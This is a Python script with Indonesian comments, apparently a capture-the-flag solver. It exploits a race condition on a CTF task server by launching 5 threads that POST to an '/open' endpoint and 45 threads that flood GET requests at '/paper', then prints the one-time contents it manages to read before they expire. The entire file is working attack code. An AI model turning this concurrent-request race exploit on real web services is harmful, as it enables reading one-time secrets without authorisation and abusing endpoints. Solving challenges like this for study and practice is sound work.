import requests
import threading
import time

# Base URL flag kamu
BASE_URL = "http://tasks.4x10m.ru:20648/s/7b0d7d1a77424fc3a11e0f2c3129f64e"
OPEN_URL = f"{BASE_URL}/open"
PAPER_URL = f"{BASE_URL}/paper"

# Session untuk pooling koneksi biar lebih ngebut
session = requests.Session()

# Tempat menyimpan hasil respon yang unik
hasil_unik = set()

def tembak_open():
    """Fase 1: Meminta server untuk 'mengeluarkan' kartu"""
    try:
        session.post(OPEN_URL)
    except:
        pass

def tembak_paper(thread_id):
    """Fase 2: Membombardir untuk membaca kartu sebelum hangus"""
    try:
        res = session.get(PAPER_URL)
        # Jika berhasil dibaca (200 OK)
        if res.status_code == 200:
            hasil_unik.add(res.text)
    except:
        pass

print("[*] Menyiapkan pasukan Thread...")
threads = []

# 1. Kita siapkan 5 Thread untuk spam POST /open (biar pasti kepanggil)
for i in range(5):
    t = threading.Thread(target=tembak_open)
    threads.append(t)

# 2. Kita siapkan 45 Thread untuk spam GET /paper
for i in range(45):
    t = threading.Thread(target=tembak_paper, args=(i,))
    threads.append(t)

print("[*] 3... 2... 1... SERANG BARENG-BARENG!!!")

# Menjalankan semua thread di milidetik yang nyaris bersamaan
for t in threads:
    t.start()

# Menunggu debu pertempuran mereda
for t in threads:
    t.join()

print("\n[*] Serangan selesai. Mari kita periksa hasil tangkapan:\n")

# Menampilkan hasil
if not hasil_unik:
    print("[-] Kosong bro. Catatan keburu hangus atau tidak sempat terbaca.")
    print("[-] Kemungkinan kamu harus ambil link baru dari web CTF-nya.")
else:
    for ke, teks in enumerate(hasil_unik):
        print("=" * 50)
        print(f" HASIL UNIK KE-{ke + 1}")
        print("=" * 50)
        print(teks.strip())
        print("=" * 50 + "\n")
